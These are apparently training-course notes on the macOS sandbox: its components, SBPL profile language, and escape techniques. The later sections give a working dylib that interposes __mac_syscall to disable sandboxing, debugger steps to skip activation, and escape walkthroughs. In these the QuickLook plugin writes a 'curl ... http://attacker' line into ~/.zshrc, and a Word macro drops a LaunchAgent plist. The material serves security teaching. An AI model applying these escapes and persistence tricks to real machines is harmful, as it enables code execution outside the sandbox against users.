# Module 8: The macOS Sandbox

## Sandbox Internals

Apple's sandbox (originally "Seatbelt", OS X 10.5) isolates applications from each other and limits damage from compromised apps.

### Components

| Component | Path | Role |
|-----------|------|------|
| Userland daemon | `/usr/libexec/sandboxd` | Sandbox management |
| Private framework | `/System/Library/PrivateFrameworks/AppSandbox.framework` | Sandbox APIs |
| Kernel extension | `/System/Library/Extensions/Sandbox.kext` | Enforcement via MACF hooks |

The kernel extension hooks almost all important kernel functions (file ops, syscalls, Mach lookups) via the Mandatory Access Control Framework (MACF).

### Sandbox Activation

- **Voluntary**: app calls `sandbox_init` (original method, pre-10.7)
- **Entitlement-based** (10.7+): `com.apple.security.app-sandbox` = true forces sandboxing
- **Mac App Store**: sandbox entitlement is mandatory

### Sandbox Containers

Sandboxed apps are containerized under `~/Library/Containers/<bundle-id>/`:

```bash
ls ~/Library/Containers/com.barebones.bbedit/
# Container.plist - sandbox environment info (binary profile data, entitlements, params)
# Data/           - app data directory with symlinks to Desktop, Downloads, etc.
```

`Container.plist` contains:
- `SandboxProfileData` - binary sandbox profile (base64)
- `SandboxProfileDataValidationEntitlementsKey` - app entitlements
- `SandboxProfileDataValidationRedirectablePathsKey` - accessible locations via symlinks

### Sandbox Initialization Flow

```
1. dyld maps libSystem.B.dylib
2. libSystem.B initializer calls libsystem_secinit.dylib`_libsecinit_appsandbox
3. _libsecinit_appsandbox calls xpc_copy_entitlements_for_self
4. Calls xpc_pipe_routine to register with secinitd (sends entitlements)
5. secinitd determines sandbox profile, returns it in reply
6. _libsecinit_appsandbox calls __mac_syscall("Sandbox", 0, arg)
7. Sandbox.kext puts process in sandbox
```

### Examining in Debugger

```bash
lldb ./sandboxed
(lldb) b xpc_pipe_routine
(lldb) run
# Continue until backtrace shows _libsecinit_appsandbox
(lldb) p (char *)xpc_copy_description($rsi)  # dump XPC message
(lldb) register read $rdx                     # reply address

# Set conditional breakpoint on sandbox activation
(lldb) breakpoint set --name __mac_syscall --condition '($rsi == 0)'
(lldb) c

# Skip sandbox activation
(lldb) register write $rip <addr_after_syscall>
(lldb) register write $rax 0
```

## Disabling Sandbox via Interposing

Interpose `__mac_syscall` to skip sandbox initialization:

```c
#include <stdio.h>
int __mac_syscall(const char *_policyname, int _call, void *_arg);

#define DYLD_INTERPOSE(_replacement, _replacee) \
    __attribute__((used)) static struct { \
        const void* replacement; const void* replacee; \
    } _interpose_##_replacee __attribute__((section("__DATA, __interpose"))) = { \
        (const void*)(unsigned long)&_replacement, \
        (const void*)(unsigned long)&_replacee };

int offsec__mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall: policy=%s, call=%d, arg=%p\n", _policyname, _call, _arg);
    return 0;  // always succeed
}
DYLD_INTERPOSE(offsec__mac_syscall, __mac_syscall);
```

```bash
gcc -dynamiclib interpose.c -o interpose.dylib
DYLD_INSERT_LIBRARIES=interpose.dylib ./sandboxed
# __mac_syscall: policy=Sandbox, call=0, arg=0x... (this is sandbox activation - skipped)
# File created successfully despite sandbox entitlement
```

Also possible via Info.plist `LSEnvironment` to auto-inject the dylib.

## Sandbox Profile Language (SBPL)

Apple uses SBPL (Scheme dialect, TinyScheme interpreter) for sandbox profiles.

### Basic Syntax

```scheme
(version 1)           ; required, always 1
(allow default)       ; allow everything unless denied
(deny default)        ; deny everything unless allowed
(import "system.sb")  ; import another profile
```

### Actions and Operations

```scheme
(allow <operation> <filters...>)
(deny <operation> <filters...>)
```

**Key operations**:
- `file-read*`, `file-write*`, `file*` (all file ops)
- `file-read-data`, `file-read-metadata` (granular)
- `process-exec*`, `process-fork`
- `mach-lookup`
- `network-outbound`, `network-inbound`
- `sysctl*`, `iokit-open`, `signal`

### Filters

| Filter | Description |
|--------|-------------|
| `(subpath "/path")` | Everything under path |
| `(literal "/path/file")` | Exact path |
| `(regex #"^/pattern/.*")` | Regular expression match |
| `(global-name "com.apple.service")` | Mach service name |
| `(remote ip "*:4444")` | Network address/port |
| `(vnode-type REGULAR-FILE)` | File type filter |

### Compound Filters

```scheme
(require-any <filter1> <filter2>)    ; OR
(require-all <filter1> <filter2>)    ; AND
```

### Examples

```scheme
; Allow reading /System and /usr/share
(allow file-read* (subpath "/System") (subpath "/usr/share"))

; Allow reading a specific file
(allow file-read* (literal "/tmp/somefile"))

; Allow writes matching regex
(allow file-write* (regex #"^/private/var/.*"))

; Allow Mach service lookups
(allow mach-lookup
    (global-name "com.apple.analyticsd")
    (global-name "com.apple.analyticsd.messagetracer"))

; Allow only /bin/ls execution
(allow process-exec* (literal "/bin/ls"))

; Deny network to port 4444
(deny network-outbound (remote ip "*:4444"))

; Conditional on entitlement
(when (entitlement "com.apple.security.network.client")
    (allow network-outbound (remote ip)))
```

### Testing Profiles

```bash
sandbox-exec -f profile.sb <command> [args...]

# Example: restrict file access
echo "secret" > /private/tmp/secret.txt
sandbox-exec -f secret-file.sb cat /private/tmp/secret.txt
# Operation not permitted

# Check sandbox logs
log show --style syslog --predicate 'eventMessage contains[c] "sandbox"' --last 1m
```

### System Sandbox Profiles

- `/usr/share/sandbox/` - various daemon profiles
- `/System/Library/Sandbox/Profiles/` - system profiles including `application.sb`

`application.sb` is the default profile for `com.apple.security.app-sandbox` apps. Entitlements like `com.apple.security.network.client` unlock additional permissions within this profile.

## Sandbox Escapes

### Two Main Strategies

1. **Kernel exploit** - escape sandbox + escalate privileges simultaneously
2. **Drop executable/script for non-sandboxed process to run**:
   - Write PLIST to `~/Library/LaunchAgents` (executed by launchd outside sandbox)
   - Write to `~/.zshrc` (executed by Terminal outside sandbox)
   - Communicate with non-sandboxed Mach service that can exec binaries

### QuickLook Plugin Sandbox Escape

**Vulnerability**: QuickLook plugin sandbox profile (`quicklook-satellite-legacy.sb`) allows `(allow file-read* file-write*)` with `(deny default)`.

The profile is an allow-list but permits file read/write everywhere.

**Exploitation**:
1. Create a QuickLook plugin for `.md` files (placed in `~/Library/QuickLook/`)
2. Plugin runs inside `ExternalQuickLookSatellite` (sandboxed)
3. Direct `curl` from plugin is blocked (no network-outbound)
4. Write to `~/.zshrc` IS allowed (file-write* permits it)
5. When user opens Terminal, `.zshrc` executes outside sandbox

```objc
// Inside GeneratePreviewForURL:
NSString *bypass = @"curl -o /Users/offsec/a.txt http://attacker";
NSString *dest = @"/Users/offsec/.zshrc";
[bypass writeToFile:dest atomically:YES encoding:NSUTF8StringEncoding error:nil];
```

```bash
qlmanage -m | grep QLSample   # verify plugin loaded
# Preview an .md file -> .zshrc created -> open Terminal -> curl executes
```

### Microsoft Word Sandbox Escape (2018)

**Root cause**: `com.apple.security.temporary-exception.sbpl` entitlement in Word:

```scheme
(allow file-read* file-write*
    (require-any
        (require-all (vnode-type REGULAR-FILE) (regex #"(^|/)~\$[^/]+$"))))
```

This allows read/write to any file starting with `~$` (Word's temp file convention).

**Exploitation**:
1. VBA macro uses `popen` to write files
2. `echo 11 > /Users/offsec/2.txt` -- BLOCKED by sandbox
3. `echo 11 > /Users/offsec/~$2.txt` -- ALLOWED (matches regex)
4. Drop plist named `~$escape.plist` into `~/Library/LaunchAgents`
5. launchd parses ALL `.plist` files in that directory regardless of name
6. Log out/in -> launchd executes the plist -> sandbox escape

```vba
Private Declare PtrSafe Function popen Lib "libc.dylib" (ByVal command As String, ByVal mode As String) As LongPtr

Sub test()
    ' Build plist XML string with RunAtLoad and bash command
    r = popen("echo """ & plist & """ > " & _
        "/Users/offsec/Library/LaunchAgents/~\$escape.plist", "r")
End Sub
```

**Patch**: Microsoft added a deny rule:
```scheme
(deny file-write* (subpath "/Users/offsec/Library/LaunchAgents"))
```
